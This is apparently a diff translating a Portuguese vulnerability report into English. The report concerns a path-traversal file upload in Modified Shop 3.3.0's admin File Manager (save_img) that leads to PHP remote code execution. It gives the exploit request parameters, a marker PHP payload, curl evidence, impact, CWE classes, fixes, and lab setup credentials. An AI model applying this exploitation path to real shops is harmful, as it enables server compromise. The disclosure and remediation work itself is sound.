@@ -112,7 +112,7 @@ POST /admin/includes/modules/filemanager/ajax_calls.php?action=save_img
 Content-Type: application/x-www-form-urlencoded
 ```
 
-Parâmetros:
+Parameters:
 
 ```text
 path=
@@ -120,15 +120,15 @@ name=../export/RS_FILEMANAGER_EXPORT_TEST33.php
 url=data:image/png;base64,BASE64_DO_CONTEUDO
 ```
 
-Conteúdo PHP utilizado:
+PHP Payload Used:
 
 ```php
 <?php echo 'RS_FILEMANAGER_PHP_EXEC'; ?>
 ```
 
-### PoC com JavaScript Fetch
+### PoC with JavaScript Fetch
 
-Executar no console do navegador com a sessão administrativa e o File Manager inicializados:
+Execute in the browser console with an authenticated administrative session and the File Manager initialized:
 
 ```javascript
 (async () => {
@@ -160,36 +160,36 @@ Executar no console do navegador com a sessão administrativa e o File Manager i
 })();
 ```
 
-### Evidência de gravação
+### File Write Evidence
 
-O arquivo foi encontrado no seguinte caminho:
+The file was found at the following path:
 
 ```text
 /var/www/html/export/RS_FILEMANAGER_EXPORT_TEST33.php
 ```
 
-Resultado:
+Result:
 
 ```text
 -rw-r--r-- 1 www-data www-data 40 Nov 5 18:02 RS_FILEMANAGER_EXPORT_TEST33.php
 ```
 
-Conteúdo:
+Content:
 
 ```php
 <?php echo 'RS_FILEMANAGER_PHP_EXEC'; ?>
 ```
 
-### Evidência de execução remota
+### Remote Code Execution Evidence
 
-Requisição realizada:
+Request Performed:
 
 ```bash
 curl -i --max-time 10 \
   http://127.0.0.1/export/RS_FILEMANAGER_EXPORT_TEST33.php
 ```
 
-Resposta:
+Response:
 
 ```http
 HTTP/1.1 200 OK
@@ -200,25 +200,34 @@ Content-Type: text/html; charset=UTF-8
 RS_FILEMANAGER_PHP_EXEC
 ```
 
-O conteúdo PHP foi interpretado pelo servidor, em vez de ser entregue como código-fonte.
+The PHP content was interpreted by the server rather than being delivered as source code.
 
-A execução do marcador confirma a capacidade de executar código PHP arbitrário gravado por meio da funcionalidade vulnerável.
+The successful execution of the marker confirms the ability to execute arbitrary PHP code written through the vulnerable functionality.
 
-## Impacto
+## Impact
 
-Um usuário que consiga utilizar o File Manager com uma sessão administrativa válida poderá gravar arquivos PHP em diretórios acessíveis pelo servidor web.
+A user able to access the File Manager with a valid administrative session may write PHP files to directories accessible by the web server.
 
-As consequências potenciais incluem:
+Potential consequences include:
 
-- Execução remota de código PHP.
-- Comprometimento da aplicação e dos dados acessíveis pelo usuário do servidor web.
-- Leitura e alteração de arquivos conforme as permissões do processo PHP.
-- Instalação de backdoors persistentes.
-- Comprometimento de outros componentes hospedados no mesmo ambiente, dependendo das permissões e do isolamento.
+- Remote Code Execution (RCE) through PHP.
+- Compromise of the application and data accessible to the web server user.
+- Reading and modifying files according to the PHP process permissions.
+- Installation of persistent backdoors.
+- Compromise of other components hosted in the same environment, depending on permissions and isolation mechanisms.
 
-A PoC demonstrou execução de PHP no contexto do servidor web. Não foi necessário executar comandos do sistema operacional para confirmar a vulnerabilidade.
+The PoC demonstrated PHP execution in the context of the web server. Execution of operating system commands was not required to confirm the vulnerability.
 
-## Recomendações
+## Recommendations
+
+1. Apply security validation to both `path` and `name`.
+2. Reject filenames containing directory separators or path traversal sequences.
+3. Restrict permitted extensions to an explicit allowlist of image formats.
+4. Validate the actual image content, preferably by decoding and recreating the image on the server.
+5. Use absolute paths and validate the final destination with `realpath()`, ensuring it remains within the authorized directory.
+6. Disable PHP execution in directories intended for user-uploaded files.
+7. Review the web server user's write permissions and restrict access to the File Manager.
+8. Implement CSRF protection and verify authorization for every request.
 
 1. Aplicar validação de segurança tanto em `path` quanto em `name`.
 2. Rejeitar nomes contendo separadores de diretório e sequências de traversal.
@@ -229,21 +238,22 @@ A PoC demonstrou execução de PHP no contexto do servidor web. Não foi necess�
 7. Revisar permissões de escrita do usuário do servidor web e limitar o acesso ao File Manager.
 8. Implementar proteção CSRF e verificar a autorização da operação em cada requisição.
 
-## Classificação
+## Classification
 
 - CWE-434 — Unrestricted Upload of File with Dangerous Type.
 - CWE-22 — Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal').
 - CWE-94 — Improper Control of Generation of Code ('Code Injection').
 
-## Conclusão
+## Conclusion
 
-A vulnerabilidade foi confirmada por análise estática e exploração dinâmica no Modified Shop 3.3.0 rev. 16825.
+The vulnerability was confirmed through static code analysis and dynamic exploitation in Modified Shop 3.3.0 rev. 16825.
 
-A funcionalidade `save_img` permite gravar conteúdo PHP fora do diretório de upload configurado, por meio da manipulação do parâmetro `name`. O arquivo resultante é acessível via HTTP e executado pelo interpretador PHP do Apache.
+The `save_img` functionality allows PHP content to be written outside the configured upload directory through manipulation of the `name` parameter. The resulting file is accessible over HTTP and executed by Apache's PHP interpreter.
 
-**Status: Confirmado — Arbitrary File Upload + Path Traversal leading to Remote Code Execution (RCE).**
+**Status: Confirmed — Arbitrary File Upload + Path Traversal leading to Remote Code Execution (RCE).**
 
-A exploração demonstrada requer uma sessão administrativa válida com o File Manager inicializado.
+The demonstrated exploitation requires a valid administrative session with the File Manager initialized.
+
 
 ## Deploy Enviroment
 ### Update and Upgrade Linnux host
@@ -291,11 +301,19 @@ or
 sudo docker compose up -d
 ```
 
-## Credenciais:
+## Credentials:
 ```
 email: admin@redscan.local
 Password: RedScan@2026!
 ```
+
+
+## Steps to reproduce
+
+### Access you web browser and provide login in the web application
+
+http://192.168.1.193:8080
+
 
 
 
